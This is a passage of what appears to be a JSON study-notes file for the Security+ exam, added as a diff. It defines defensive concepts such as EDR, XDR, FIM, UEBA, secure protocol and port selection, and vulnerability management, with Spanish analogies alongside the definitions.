+        "raw_content": "* **Definition:** A process that detects and blocks unsolicited, unwanted emails from reaching user inboxes using techniques such as content analysis, Bayesian filtering, DNS-based blocklists, and predefined email filtering rules.\n\nSpam filtering analyzes email content for commonly used spam language (e.g., \"lottery,\" \"free,\" \"prize\") and evaluates sender reputation to determine if an email should be delivered, quarantined, or rejected.\n\n> *Como un portero de club que tiene una lista negra de palabras: si tu mensaje de entrada incluye frases prohibidas, no pasas.*\n\n---"
+      },
+      {
+        "name": "Endpoint Detection and Response (EDR)",
+        "definition": "The objective domain (4.5) covering the cybersecurity technology category that continuously monitors endpoint devices for signs of threats, records data in a centralized database, and enables security analysts to investigate, respond to, and remediate identified threats.",
+        "analogy": "*Como la evolución de un sistema de seguridad: primero cámaras enfocadas en una sola entrada (EDR), un sistema de sellos que detecta manipulación de objetos específicos (FIM), y finalmente una central de monitoreo que conecta todas las entradas, cámaras y sensores del edificio en un solo panel (XDR).*",
+        "raw_content": "* **Definition:** The objective domain (4.5) covering the cybersecurity technology category that continuously monitors endpoint devices for signs of threats, records data in a centralized database, and enables security analysts to investigate, respond to, and remediate identified threats.\n\nThis objective covers three related but distinct technologies: **EDR** itself, **File Integrity Monitoring (FIM)** as a component technology, and **Extended Detection and Response (XDR)** as the evolved, multi-layer successor.\n\n> *Como la evolución de un sistema de seguridad: primero cámaras enfocadas en una sola entrada (EDR), un sistema de sellos que detecta manipulación de objetos específicos (FIM), y finalmente una central de monitoreo que conecta todas las entradas, cámaras y sensores del edificio en un solo panel (XDR).*"
+      },
+      {
+        "name": "EDR: The Six-Step EDR Process",
+        "definition": "The operational workflow used by EDR solutions to continuously monitor and gather endpoint data, consisting of data collection, data consolidation, threat detection, alerts and threat response, threat investigation, and remediation.",
+        "analogy": "",
+        "raw_content": "* **Definition:** The operational workflow used by EDR solutions to continuously monitor and gather endpoint data, consisting of data collection, data consolidation, threat detection, alerts and threat response, threat investigation, and remediation.\n1. **Data Collection:** Gathered from all endpoints (desktops, laptops, mobile devices) — system processes, registry changes, memory usage, network traffic patterns.\n2. **Data Consolidation:** Collected data is sent to a centralized security database (on-premise or cloud) for analysis.\n3. **Threat Detection:** Uses **signature-based detection** (known malicious patterns) and **behavior-based detection** (abnormal behavior deviating from baseline).\n4. **Alerts and Threat Response:** Sends alerts to the security team or performs automated containment actions, such as isolating the affected endpoint from the network.\n5. **Threat Investigation:** Provides detailed timelines of endpoint activity and forensic data to determine the threat's nature, origin, and impact.\n6. **Remediation:** Removes malicious files, reverses changes made by the threat, and restores systems to a secure baseline."
+      },
+      {
+        "name": "EDR: Extended Detection and Response (XDR)",
+        "definition": "A security strategy that integrates multiple protection technologies (endpoint, network, email, server, cloud) into a single unified platform to improve threat detection accuracy, automate correlation across security layers, and simplify incident response.",
+        "analogy": "By using an extended detection and response solution, you no longer need to have separate solutions for your network security, email security, and endpoint security. Instead, your organization can consolidate these separate solutions into a single, consolidated platform.",
+        "raw_content": "* **Definition:** A security strategy that integrates multiple protection technologies (endpoint, network, email, server, cloud) into a single unified platform to improve threat detection accuracy, automate correlation across security layers, and simplify incident response.\n> By using an extended detection and response solution, you no longer need to have separate solutions for your network security, email security, and endpoint security. Instead, your organization can consolidate these separate solutions into a single, consolidated platform.\n\nXDR extends the capabilities of EDR by collecting and correlating data **across all security layers simultaneously**, eliminating the need for separate, siloed security solutions.\n\n> *Como un sistema de seguridad de un aeropuerto moderno: en lugar de tener cámaras, detectores de metales y scanners de equipaje como sistemas separados, todo está integrado en una sola consola que correlaciona las alertas.*"
+      },
+      {
+        "name": "EDR: File Integrity Monitoring (FIM)",
+        "definition": "A security control that validates the integrity of operating system and application files by continuously comparing their current cryptographic hash values against a known-good baseline, alerting when unauthorized changes are detected.",
+        "analogy": "*Como un inventario sellado de un museo: cada objeto tiene una etiqueta de seguridad. Si la etiqueta no coincide al verificar, algo fue movido o reemplazado.*",
+        "raw_content": "* **Definition:** A security control that validates the integrity of operating system and application files by continuously comparing their current cryptographic hash values against a known-good baseline, alerting when unauthorized changes are detected.\n\nFIM uses an **agent** to monitor critical system files. Each file is **hashed** and the hash digest is stored in a secure baseline database. If an unauthorized change is detected (the current hash no longer matches the baseline), the security team is alerted to investigate whether this is a true security breach.\n\n> *Como un inventario sellado de un museo: cada objeto tiene una etiqueta de seguridad. Si la etiqueta no coincide al verificar, algo fue movido o reemplazado.*\n\nFIM monitors: binary files · system application files · configuration files · parameter files. It is often included as a component of broader EDR or XDR solutions.\n\n\n| Technology | Scope                                        | Focus                                           |\n| ---------- | -------------------------------------------- | ----------------------------------------------- |\n| **EDR**    | Endpoints only                               | Computers, laptops, mobile devices              |\n| **XDR**    | Endpoints + Network + Email + Cloud + Server | All security layers, correlated in one platform |\n| **FIM**    | File system integrity                        | Often included as a component of EDR/XDR        |\n\n---"
+      },
+      {
+        "name": "User Behavior Analytics (UBA) // User and Entity Behavior Analytics (UEBA)",
+        "definition": "The objective domain (4.5) covering the advanced cybersecurity strategy that uses big data, machine learning, and statistical analysis to establish a baseline of normal user behavior, then continuously monitors for anomalies that may indicate insider threats, compromised credentials, or external attacks.",
+        "analogy": "*Como un banco que conoce tus patrones de compra: si de repente aparece una transacción desde otro país a las 3 AM, el sistema lo marca automáticamente como sospechoso.*",
+        "raw_content": "* **Definition:** The objective domain (4.5) covering the advanced cybersecurity strategy that uses big data, machine learning, and statistical analysis to establish a baseline of normal user behavior, then continuously monitors for anomalies that may indicate insider threats, compromised credentials, or external attacks.\n\nUBA collects data from network traffic, user devices, and application logs to learn what **normal** looks like for each user. Deviations from the baseline trigger alerts for security team review.\n\n> *Como un banco que conoce tus patrones de compra: si de repente aparece una transacción desde otro país a las 3 AM, el sistema lo marca automáticamente como sospechoso.*\n\n**UBA use cases:**\n\n- A user who always logs in during business hours suddenly logs in at 2 AM → flagged as anomalous.\n- An instructor suddenly attempting to access HR or financial data they have never accessed before → flagged as suspicious.\n- A user account that normally reads data suddenly attempts to modify or delete data → flagged as potentially compromised.\n\n**Key benefits:**\n\n- **Early threat detection:** Identifies threats before significant damage occurs (e.g., flagging a large data download as a potential exfiltration attempt that manual log review might miss for weeks).\n- **Insider threat detection:** Detects subtle behavioral changes invisible to signature-based tools.\n- **Improved incident response:** Provides detailed behavioral timelines to accelerate investigation; can automatically log out a user account suspected of compromise."
+      },
+      {
+        "name": "UBA: UEBA — User and Entity Behavior Analytics",
+        "definition": "An extension of UBA that expands monitoring beyond user accounts to include entities — network devices such as routers, servers, and endpoints — providing a more comprehensive view of anomalous activity across the entire network environment.",
+        "analogy": "*UBA monitorea a las personas; UEBA monitorea a las personas Y a las máquinas.*",
+        "raw_content": "* **Definition:** An extension of UBA that expands monitoring beyond user accounts to include entities — network devices such as routers, servers, and endpoints — providing a more comprehensive view of anomalous activity across the entire network environment.\n\n> *UBA monitorea a las personas; UEBA monitorea a las personas Y a las máquinas.*\n\n---"
+      },
+      {
+        "name": "Selecting Secure Protocols",
+        "definition": "The objective domain (4.5) covering the process of choosing encrypted protocols, appropriate ports, and the correct transport method to ensure that data confidentiality, integrity, and reliability are maintained across an enterprise network.",
+        "analogy": "*Como elegir entre enviar dinero en efectivo por correo ordinario o en un sobre blindado con rastreo: ambos llegan, pero solo uno es seguro.*",
+        "raw_content": "* **Definition:** The objective domain (4.5) covering the process of choosing encrypted protocols, appropriate ports, and the correct transport method to ensure that data confidentiality, integrity, and reliability are maintained across an enterprise network.\n\nThis objective covers three independent decisions an architect must make: **protocol selection** (encrypted vs. plaintext), **port selection** (which logical port and range to use), and **transport method selection** (TCP vs. UDP).\n\n> *Como elegir entre enviar dinero en efectivo por correo ordinario o en un sobre blindado con rastreo: ambos llegan, pero solo uno es seguro.*"
+      },
+      {
+        "name": "Selecting Secure Protocols: Protocol Selection",
+        "definition": "The practice of choosing encrypted, authenticated network protocols over their plaintext equivalents to ensure data confidentiality, integrity, and authenticity during transmission across networks.",
+        "analogy": "",
+        "raw_content": "* **Definition:** The practice of choosing encrypted, authenticated network protocols over their plaintext equivalents to ensure data confidentiality, integrity, and authenticity during transmission across networks.\n\nThe fundamental rule: **always choose the encrypted version of a protocol** when one is available. Most secure protocols are simply the insecure version with an \"S\" appended (HTTPS, SFTP, SMTPS, IMAPS, POP3S, SNMPS). **Telnet vs. SSH** is a notable exception to the \"just add S\" naming pattern — Telnet transmits everything (including login credentials) in plaintext, vulnerable to on-path/eavesdropping attacks, while SSH encrypts the entire session using strong passwords and public key authentication.\n\n| Use Case                    | Insecure Protocol | Secure Protocol                 |\n| --------------------------- | ----------------- | ------------------------------- |\n| Web browsing                | HTTP (port 80)    | HTTPS (port 443)                |\n| File transfer               | FTP               | SFTP (encrypted via SSH tunnel) |\n| Remote CLI admin            | Telnet            | SSH                             |\n| Send email                  | SMTP (port 25)    | SMTPS (port 587)                |\n| Receive email (download)    | POP3 (port 110)   | POP3S (port 995)                |\n| Receive email (server-side) | IMAP (port 143)   | IMAPS (port 993)                |"
+      },
+      {
+        "name": "Selecting Secure Protocols: Port Selection",
+        "definition": "The process of assigning logical port numbers to network services and protocols, following the principle of least privilege by opening only ports required for authorized applications and blocking all others to minimize the attack surface.",
+        "analogy": "*Como los canales de radio: los bien conocidos son la AM/FM estándar que todo el mundo conoce; los registrados son los canales de cable asignados; los dinámicos son frecuencias temporales que el sistema asigna según necesidad.*",
+        "raw_content": "* **Definition:** The process of assigning logical port numbers to network services and protocols, following the principle of least privilege by opening only ports required for authorized applications and blocking all others to minimize the attack surface.\n\nPorts are categorized into three ranges:\n\n| Range                       | Ports         | Description                                                |\n| --------------------------- | ------------- | ---------------------------------------------------------- |\n| **Well-Known Ports**        | 0–1023        | Reserved for system/core services (HTTP, HTTPS, SSH, etc.) |\n| **Registered Ports**        | 1024–49,151   | Used by software applications                              |\n| **Dynamic / Private Ports** | 49,152–65,535 | Randomly assigned by the OS for client-side connections    |\n\n> *Como los canales de radio: los bien conocidos son la AM/FM estándar que todo el mundo conoce; los registrados son los canales de cable asignados; los dinámicos son frecuencias temporales que el sistema asigna según necesidad.*\n\n**Using non-default ports:** Some organizations use non-standard port numbers (e.g., port 8888 for HTTP) to add obscurity. This provides minimal security benefit and should **never replace** proper authentication, encryption, and patching. It also increases administrative and troubleshooting complexity.\n\n⚠️ **Exam Tip:** Follow the **principle of least privilege** for ports — open only what is necessary for each application. Block everything else on the firewall."
+      },
+      {
+        "name": "Selecting Secure Protocols: Transport Method Selection (TCP vs. UDP)",
+        "definition": "The choice between TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) as the transport layer method for data transmission, based on whether data integrity or transmission speed is the higher priority for the application.",
+        "analogy": "*Como elegir entre un servicio de mensajería con confirmación de entrega (TCP) y un reparto masivo de volantes sin seguimiento (UDP): uno garantiza que llegó; el otro es más rápido pero no verifica.*",
+        "raw_content": "* **Definition:** The choice between TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) as the transport layer method for data transmission, based on whether data integrity or transmission speed is the higher priority for the application.\n\n> *Como elegir entre un servicio de mensajería con confirmación de entrega (TCP) y un reparto masivo de volantes sin seguimiento (UDP): uno garantiza que llegó; el otro es más rápido pero no verifica.*"
+      },
+      {
+        "name": "Transport Method: TCP",
+        "definition": "A connection-oriented transport layer protocol that establishes a connection before transmitting data, uses acknowledgements, sequencing, and retransmission to guarantee error-free, in-order data delivery.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A connection-oriented transport layer protocol that establishes a connection before transmitting data, uses acknowledgements, sequencing, and retransmission to guarantee error-free, in-order data delivery.\n\nTCP is used when **data accuracy is paramount**: web servers, email servers, file transfers. It adds overhead but ensures that every packet arrives correctly and in the right order."
+      },
+      {
+        "name": "Transport Method: UDP",
+        "definition": "A connectionless transport layer protocol that sends data without establishing a connection, provides no error checking or guaranteed delivery, and prioritizes transmission speed over accuracy.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A connectionless transport layer protocol that sends data without establishing a connection, provides no error checking or guaranteed delivery, and prioritizes transmission speed over accuracy.\n\nUDP is used when **speed matters more than perfect accuracy**: streaming video, VoIP, online gaming. Lost packets in video streaming typically go unnoticed by the human eye (30 FPS; losing 1 frame is imperceptible).\n\n| Characteristic         | TCP                                     | UDP                           |\n| ---------------------- | --------------------------------------- | ----------------------------- |\n| **Connection**         | Connection-oriented (handshake)         | Connectionless                |\n| **Delivery guarantee** | Yes — acknowledgements + retransmission | No                            |\n| **Error checking**     | Yes                                     | No                            |\n| **Speed**              | Slower (overhead)                       | Faster (low overhead)         |\n| **Use cases**          | Web, email, file transfer               | Video streaming, VoIP, gaming |\n\n---"
+      }
+    ]
+  },
+  {
+    "sectionId": "S22",
+    "sectionTitle": "Section 22: Vulnerability Management",
+    "concepts": [
+      {
+        "name": "Vulnerability Management",
+        "definition": "A systematic and ongoing process of identifying, evaluating, prioritizing, and mitigating vulnerabilities in computer systems, networks, and software applications to maintain a secure and resilient cybersecurity posture.",
+        "analogy": "*Es como el mantenimiento preventivo de un edificio: no esperas a que el techo se caiga para revisarlo. Inspeccionas regularmente, identificas grietas, las clasificas por urgencia y las reparas antes de que causen un desastre mayor.*",
+        "tables": [],
+        "list_items": [],
+        "raw_content": "* **Definition:** A systematic and ongoing process of identifying, evaluating, prioritizing, and mitigating vulnerabilities in computer systems, networks, and software applications to maintain a secure and resilient cybersecurity posture.\n\nVulnerability management is not a one-time event — it is a continuous lifecycle that includes **vulnerability scanning**, **assessment**, **remediation**, and **monitoring** to minimize the potential for security breaches and ensure the effective management of risk across the entire organization.\n\n> *Es como el mantenimiento preventivo de un edificio: no esperas a que el techo se caiga para revisarlo. Inspeccionas regularmente, identificas grietas, las clasificas por urgencia y las reparas antes de que causen un desastre mayor.*\n\nThe full process is structured around these phases:\n\n1. **Identify** — find weaknesses in systems, applications, and networks.\n2. **Analyze** — evaluate severity, likelihood of exploitation, and organizational impact.\n3. **Remediate** — apply patches, reconfigurations, or compensating controls.\n4. **Validate** — confirm remediation was effective through rescanning and auditing.\n5. **Report** — communicate findings and status to stakeholders.\n\nThis section maps entirely to **Objective 4.3** of the SY0-701 exam.\n\n---"
+      },
+      {
+        "name": "Identifying Vulnerabilities",
+        "definition": "The systematic practice of spotting and categorizing weaknesses in a system, network, or application that could potentially be exploited by a threat actor.",
+        "analogy": "*Es como contratar a un equipo de inspectores antes de comprar un edificio: revisan la estructura, la plomería, el sistema eléctrico y los cimientos para encontrar todos los problemas antes de que alguien los explote.*",
+        "tables": [
+          {
+            "headers": [
+              "Step",
+              "Name",
+              "Description"
+            ],
+            "rows": [
+              [
+                "1",
+                "**Planning**",
+                "Define policies, procedures, and mechanisms to track and evaluate vulnerabilities; determine how to test and deploy fixes."
+              ],
+              [
+                "2",
+                "**Testing**",
+                "Evaluate patches and updates in a controlled environment before broad deployment to ensure fixes do not introduce new issues."
+              ],
+              [
+                "3",
+                "**Implementation**",
+                "Deploy patches across all necessary devices and applications across the enterprise network."
+              ],
+              [
+                "4",
+                "**Auditing**",
+                "Verify that patches and configuration changes have been effectively implemented and confirm no new issues have emerged."
+              ]
+            ]
+          }
+        ],
+        "list_items": [
+          "**Static Analysis (SAST):** Reviews source code without executing it, either through manual code review (reading each line) or automated tools that scan compiled binaries for insecure coding practices.",
+          "**Dynamic Analysis (DAST):** Evaluates an application while it is actively running to identify runtime vulnerabilities. Tools such as **OWASP ZAP**, **Burp Suite**, and **Peach Fuzzer** emulate attacks in real time against a live application.",
+          "**Package Monitoring:** Ensures that the third-party libraries and components an application depends on are secure and up to date. Tools such as **Snyk** and **Dependabot** continuously scan dependencies and alert developers to known vulnerabilities in those packages before they can be exploited."
+        ],
+        "raw_content": "* **Definition:** The systematic practice of spotting and categorizing weaknesses in a system, network, or application that could potentially be exploited by a threat actor.\n\nIdentifying vulnerabilities is the first critical step in building a robust security posture. Without knowing what is broken, you cannot fix it. There are four primary methods used to identify vulnerabilities.\n\n> *Es como contratar a un equipo de inspectores antes de comprar un edificio: revisan la estructura, la plomería, el sistema eléctrico y los cimientos para encontrar todos los problemas antes de que alguien los explote.*\n\n### Identifying Vulnerabilities: Vulnerability Scanning\n\n* **Definition:** An automated method of probing networks, systems, and applications to discover known vulnerabilities by comparing the system's current state against a database of documented weaknesses.\n\nTools such as **Nessus** and **OpenVAS** perform vulnerability scans and generate detailed reports listing every detected vulnerability along with its criticality level. The cybersecurity professional's responsibility is then to **prioritize**, **patch**, and **mitigate** those vulnerabilities before a threat actor exploits them.\n\n### Identifying Vulnerabilities: Application Security\n\n* **Definition:** A set of techniques used to ensure that custom software developed by an organization is free of vulnerabilities within its codebase across the software development lifecycle.\n\nThree methods are used under application security:\n\n- **Static Analysis (SAST):** Reviews source code without executing it, either through manual code review (reading each line) or automated tools that scan compiled binaries for insecure coding practices.\n- **Dynamic Analysis (DAST):** Evaluates an application while it is actively running to identify runtime vulnerabilities. Tools such as **OWASP ZAP**, **Burp Suite**, and **Peach Fuzzer** emulate attacks in real time against a live application.\n- **Package Monitoring:** Ensures that the third-party libraries and components an application depends on are secure and up to date. Tools such as **Snyk** and **Dependabot** continuously scan dependencies and alert developers to known vulnerabilities in those packages before they can be exploited.\n\n### Identifying Vulnerabilities: Penetration Testing\n\n* **Definition:** A method that simulates real-world attacks on a system to evaluate its security posture and identify exploitable weaknesses that automated tools may not detect.\n\nThe pen test report reveals how testers were able to infiltrate or exploit the systems. The cybersecurity analyst's role is to mitigate the issues identified in that report so that the same attack vectors cannot be used again in the future.\n\n### Identifying Vulnerabilities: System and Process Audits\n\n* **Definition:** A comprehensive review of an organization's information systems, security policies, and procedures to ensure adherence to security best practices and relevant industry standards.\n\n### Identifying Vulnerabilities: The Four-Step Process\n\n* **Definition:** A structured workflow for identifying and mitigating vulnerabilities consisting of planning, testing, implementation, and auditing.\n\n| Step | Name | Description |\n| --- | --- | --- |\n| 1 | **Planning** | Define policies, procedures, and mechanisms to track and evaluate vulnerabilities; determine how to test and deploy fixes. |\n| 2 | **Testing** | Evaluate patches and updates in a controlled environment before broad deployment to ensure fixes do not introduce new issues. |\n| 3 | **Implementation** | Deploy patches across all necessary devices and applications across the enterprise network. |\n| 4 | **Auditing** | Verify that patches and configuration changes have been effectively implemented and confirm no new issues have emerged. |\n\n---"
+      },
+      {
+        "name": "Threat Intelligence Feeds",
+        "definition": "A continuous stream of data related to potential or current threats that an organization's security might be facing, collected and disseminated by security researchers, organizations, or automated tools to provide real-time or near-real-time updates on emerging threats.",
+        "analogy": "*Es como un servicio de noticias de seguridad en tiempo real: en lugar de esperar a que te ataquen para enterarte del peligro, recibes alertas sobre nuevas amenazas mientras los investigadores las descubren en el mundo real.*",
+        "tables": [],
+        "list_items": [],
+        "raw_content": "* **Definition:** A continuous stream of data related to potential or current threats that an organization's security might be facing, collected and disseminated by security researchers, organizations, or automated tools to provide real-time or near-real-time updates on emerging threats.\n\nThreat intelligence data includes new malware signatures, **indicators of compromise (IoCs)**, malicious IP addresses, URLs, and much more. The threat landscape evolves constantly — as defenses improve, threat actors pivot to new targets (from server-side to client-side to mobile to cloud attacks). Staying current requires consuming intelligence from multiple sources.\n\n> *Es como un servicio de noticias de seguridad en tiempo real: en lugar de esperar a que te ataquen para enterarte del peligro, recibes alertas sobre nuevas amenazas mientras los investigadores las descubren en el mundo real.*\n\n### Threat Intelligence Feeds: Open-Source Intelligence (OSINT)\n\n* **Definition:** Intelligence collected from publicly available sources including reports, forums, news articles, blogs, and social media posts, typically available at no cost to the organization.\n\nPopular OSINT feeds include **AlienVault Open Threat Exchange**, the **SANS Internet Storm Center**, and security research blogs and forums. OSINT provides insights into emerging threats without requiring investment in proprietary solutions.\n\n### Threat Intelligence Feeds: Proprietary or Third-Party Feeds\n\n* **Definition:** Threat intelligence feeds provided by commercial vendors under a subscription model, offering more refined, analyzed, and timely information than open-source alternatives.\n\nWell-known providers include **FireEye**, **McAfee**, and **Symantec**. These feeds integrate directly into **SIEM** tools and other security platforms to provide analysts with actionable insights and automated threat response capabilities.\n\n### Threat Intelligence Feeds: Information Sharing Organizations\n\n* **Definition:** Industry alliances formed to share threat intelligence among members in the same sector, enabling collective defense against threats specific to that industry.\n\n**Information Sharing and Analysis Centers (ISACs)** and **Information Sharing and Analysis Organizations (ISAOs)** connect companies in sectors such as finance, healthcare, and energy to share vulnerabilities and threat data specific to their industries. Members both receive and contribute to the collective knowledge.\n\n### Threat Intelligence Feeds: Dark Web\n\n* **Definition:** Intelligence gathered from the intentionally hidden, non-indexed portion of the Internet where threat actors discuss new hacking techniques, sell stolen data, and share information about emerging exploits — used by security researchers to gain advance warning of potential threats.\n\nBy monitoring dark web forums and marketplaces, security researchers can learn about new tools and attack methods before they become mainstream threats, providing advance warning to defenders.\n\n---"
+      },
+      {
+        "name": "Responsible Disclosure Programs",
+        "definition": "An ethical practice where a security researcher discloses information about a vulnerability in software, hardware, or an online service in a confidential manner to the relevant stakeholder — such as the software developer — allowing sufficient time to address the vulnerability before public disclosure occurs.",
+        "analogy": "*Es como avisarle a un restaurante en privado que encontraste una cucaracha en la cocina antes de publicarlo en redes sociales: les das la oportunidad de resolver el problema primero.*",
+        "tables": [],
+        "list_items": [
+          "**Increased security** — external researchers find vulnerabilities internal teams may have missed.",
+          "**Community collaboration** — builds a community invested in the product's security.",
+          "**Cost-effectiveness** — organizations pay only for validated findings, not for time spent.",
+          "Clearly defined **scope** (what is and is not in scope for testing)",
+          "Designated **communication channel** for vulnerability submissions",
+          "Transparent **reward structure** based on vulnerability severity",
+          "Clear **timeframes** for acknowledgment, validation, and remediation",
+          "**Legal protections** for researchers acting in good faith within the rules of engagement"
+        ],
+        "raw_content": "* **Definition:** An ethical practice where a security researcher discloses information about a vulnerability in software, hardware, or an online service in a confidential manner to the relevant stakeholder — such as the software developer — allowing sufficient time to address the vulnerability before public disclosure occurs.\n\n> *Es como avisarle a un restaurante en privado que encontraste una cucaracha en la cocina antes de publicarlo en redes sociales: les das la oportunidad de resolver el problema primero.*\n\nThe responsible disclosure workflow:\n\n1. Security researcher discovers a vulnerability.\n2. Researcher contacts the vendor/developer **privately** through official channels.\n3. Researcher provides enough information for the vendor to **reproduce** the vulnerability.\n4. Both parties agree on a **disclosure timeframe** (typically weeks to months).\n5. Vendor develops and deploys a **patch or hotfix** for all end users.\n6. After the agreed timeframe or successful remediation, the researcher **publicly discloses** the vulnerability to the security community.\n\n### Responsible Disclosure Programs: Bug Bounty Programs\n\n* **Definition:** A formal program created by an organization that offers monetary rewards to security researchers who find and report validated vulnerabilities in the organization's systems, providing a structured and incentivized framework for responsible disclosure.\n\nBug bounty programs can be run internally or through third-party platforms such as **HackerOne**, **Bugcrowd**, and **Synack**. Reward levels are aligned with the severity of the vulnerability — a remote code execution (critical) pays significantly more than an information disclosure (low).\n\n**Benefits of bug bounty programs:**\n\n- **Increased security** — external researchers find vulnerabilities internal teams may have missed.\n- **Community collaboration** — builds a community invested in the product's security.\n- **Cost-effectiveness** — organizations pay only for validated findings, not for time spent.\n\n**Key elements of a successful program:**\n\n- Clearly defined **scope** (what is and is not in scope for testing)\n- Designated **communication channel** for vulnerability submissions\n- Transparent **reward structure** based on vulnerability severity\n- Clear **timeframes** for acknowledgment, validation, and remediation\n- **Legal protections** for researchers acting in good faith within the rules of engagement\n\n---"
+      },
+      {
+        "name": "Analyzing Vulnerabilities",
+        "definition": "The process of evaluating identified vulnerabilities to confirm their existence, determine their severity and potential impact, classify them by type, and align remediation priorities with the organization's risk tolerance.",
+        "analogy": "*Es como el trabajo de un médico de urgencias haciendo triage: no todos los pacientes tienen el mismo nivel de urgencia, así que los clasifica, prioriza los más críticos y asigna los recursos donde más se necesitan.*",
+        "tables": [
+          {
+            "headers": [
+              "Finding",
+              "Definition",
+              "Example"
+            ],
+            "rows": [
+              [
+                "**True Positive**",
+                "Real vulnerability correctly identified by the scanner",
+                "Scanner detects missing MS17-010 patch; patch was never installed — confirmed vulnerable"
+              ],
+              [
+                "**False Positive**",
+                "Scanner incorrectly reports a vulnerability that does not exist",
+                "Scanner reports missing Windows patch on a Linux machine — Windows patches do not apply"
+              ],
+              [
+                "**True Negative**",
+                "Scanner correctly identifies no vulnerability present",
+                "Scanner confirms all patches are current — system is actually secure"
+              ],
+              [
+                "**False Negative**",
+                "Scanner fails to detect a real vulnerability that exists on the system",
+                "Vulnerability exists but scanner's definitions are outdated — not flagged, but exploitable"
+              ]
+            ]
+          },
+          {
+            "headers": [
+              "Risk Tolerance",
+              "Behavior"
+            ],
+            "rows": [
+              [
+                "**Low risk tolerance**",
+                "Even minor or moderate vulnerabilities must be remediated quickly; stringent security measures regardless of cost"
+              ],
+              [
+                "**High risk tolerance**",
+                "Organization may accept certain exposures and monitor some vulnerabilities while focusing remediation on the most critical ones"
+              ]
+            ]
+          }
+        ],
+        "list_items": [],
+        "raw_content": "* **Definition:** The process of evaluating identified vulnerabilities to confirm their existence, determine their severity and potential impact, classify them by type, and align remediation priorities with the organization's risk tolerance.\n\n> *Es como el trabajo de un médico de urgencias haciendo triage: no todos los pacientes tienen el mismo nivel de urgencia, así que los clasifica, prioriza los más críticos y asigna los recursos donde más se necesitan.*\n\n### Analyzing Vulnerabilities: Vulnerability Confirmation\n\n* **Definition:** The step of determining whether a detected finding represents a real vulnerability or a scanner error, categorized as true positive, false positive, true negative, or false negative.\n\n| Finding | Definition | Example |\n| --- | --- | --- |\n| **True Positive** | Real vulnerability correctly identified by the scanner | Scanner detects missing MS17-010 patch; patch was never installed — confirmed vulnerable |\n| **False Positive** | Scanner incorrectly reports a vulnerability that does not exist | Scanner reports missing Windows patch on a Linux machine — Windows patches do not apply |\n| **True Negative** | Scanner correctly identifies no vulnerability present | Scanner confirms all patches are current — system is actually secure |\n| **False Negative** | Scanner fails to detect a real vulnerability that exists on the system | Vulnerability exists but scanner's definitions are outdated — not flagged, but exploitable |\n\n⚠️ **Exam Tip:** False negatives are the most dangerous outcome because they create a false sense of security — the system appears clean but remains exploitable.\n\n### Analyzing Vulnerabilities: Prioritization\n\n* **Definition:** The process of ranking identified vulnerabilities in order of severity and potential organizational impact to ensure resources are allocated toward the most critical threats first.\n\nFactors in prioritization include **ease of exploitation**, **magnitude of potential damage**, and the **importance of the affected system to business operations**. A vulnerability in a mission-critical application that could expose sensitive customer data takes higher priority than a minor flaw in a non-critical system.\n\n#### Prioritization: CVSS — Common Vulnerability Scoring System\n\n* **Definition:** A standardized framework for assessing the severity of vulnerabilities by assigning a numeric score (0–10) based on metrics such as attack vector, impact, and exploitability, enabling consistent cross-organizational prioritization.\n\nCVSS scores guide prioritization but must be combined with organizational context — a critical-scored vulnerability on an isolated, air-gapped system may be lower priority than a medium-scored one on an externally facing web server.\n\n### Analyzing Vulnerabilities: Classification\n\n* **Definition:** The process of categorizing identified vulnerabilities based on factors such as threat type, potential impact, and affected systems to streamline management and remediation efforts.\n\nExamples of classification categories include software flaws (buffer overflow, privilege escalation), configuration errors (insecure default settings), and security policy gaps. Classification can be further informed by the CVE system.\n\n#### Classification: CVE — Common Vulnerabilities and Exposures\n\n* **Definition:** A publicly maintained database at `cve.mitre.org` that assigns a unique identifier (CVE number) to every known vulnerability, providing a standardized reference containing a description, potential impact, and known solutions or workarounds.\n\nCross-referencing scan findings with the CVE database gives cybersecurity professionals deeper context about the nature and characteristics of each vulnerability to support more informed decision-making.\n\n### Analyzing Vulnerabilities: Organizational Impact\n\n* **Definition:** The assessment of how a vulnerability affects the confidentiality, integrity, or availability of an organization's data and services, factoring in the industry context to determine appropriate prioritization.\n\nA vulnerability that exposes sensitive customer data has significant reputational and regulatory impact. A vulnerability affecting the availability of a critical service threatens business continuity. Healthcare vulnerabilities can risk patient safety; financial institution vulnerabilities can cause monetary losses and regulatory scrutiny.\n\n### Analyzing Vulnerabilities: Exposure Factor (EF)\n\n* **Definition:** A quantifiable metric representing the percentage of an asset that is likely to be damaged or affected if a specific vulnerability is exploited — used in quantitative risk management calculations.\n\nA vulnerability that could compromise an entire customer database has a high exposure factor. One that only exposes non-critical metadata has a low exposure factor. The exposure factor is a key input when calculating **Single Loss Expectancy (SLE)** and **Annualized Loss Expectancy (ALE)** in a quantitative risk assessment.\n\n### Analyzing Vulnerabilities: Risk Tolerance\n\n* **Definition:** The level of risk an organization is willing to accept in the pursuit of its objectives before action is deemed necessary to mitigate that risk.\n\n| Risk Tolerance | Behavior |\n| --- | --- |\n| **Low risk tolerance** | Even minor or moderate vulnerabilities must be remediated quickly; stringent security measures regardless of cost |\n| **High risk tolerance** | Organization may accept certain exposures and monitor some vulnerabilities while focusing remediation on the most critical ones |\n\nVulnerability management practices must align with the organization's risk tolerance to remain consistent with its overall business strategy.\n\n---"
+      },
+      {
+        "name": "Conducting Vulnerability Scans",
+        "definition": "The practice of using automated scanning tools such as Nessus or OpenVAS to systematically search for known vulnerabilities across an organization's systems and networks, generating detailed reports for analyst review.",
+        "analogy": "*Es como contratar a un equipo de inspectores de bomberos para revisar cada rincón del edificio con una lista de verificación: no improvisan, siguen un proceso estructurado y documentan cada hallazgo.*",
+        "tables": [
+          {
+            "headers": [
+              "Tool",
+              "Description"
+            ],
+            "rows": [
+              [
+                "**Nessus (Tenable)**",
+                "Industry-standard commercial scanner; Nessus Essentials is free for up to 16 IPs"
+              ],
+              [
+                "**OpenVAS / Greenbone**",
+                "Open-source vulnerability scanner; community edition available at no cost"
+              ],
+              [
+                "**QualysGuard**",
+                "Cloud-based enterprise vulnerability management platform"
+              ]
+            ]
+          }
+        ],
+        "list_items": [
+          "**Credentialed vs. Un-credentialed scans:** Credentialed scans provide the scanner with a valid username and password, granting it administrative access to find more vulnerabilities (including those only visible from inside the system). Un-credentialed scans simulate what an external attacker without credentials would find. A credentialed scan will typically discover more vulnerabilities.",
